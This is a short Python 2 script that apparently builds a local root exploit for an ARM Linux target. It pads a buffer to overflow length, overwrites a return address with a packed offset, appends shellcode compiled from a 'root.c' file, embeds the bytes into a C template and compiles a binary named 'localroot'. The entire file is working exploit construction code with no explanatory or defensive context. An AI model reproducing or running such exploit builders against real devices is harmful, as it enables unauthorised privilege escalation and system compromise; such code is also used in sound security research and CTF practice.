from pack import *
import os
import cshc
buf = ""
buf += "A" * (173 - len(buf))
buf += pl32(0x16370 + 173 + 4 + 1)
buf += "A"
buf += cshc.arch("armel").compile_file("root.c")
print 480 - len(buf)
assert len(buf) <= 480
buf_enc = ", ".join([hex(ord(ch)) for ch in buf])
open("/tmp/a.c","w").write(open("template.c").read().replace("__PAYLOAD__", buf_enc))
os.system("arm-linux-gnueabi-gcc -o localroot /tmp/a.c")
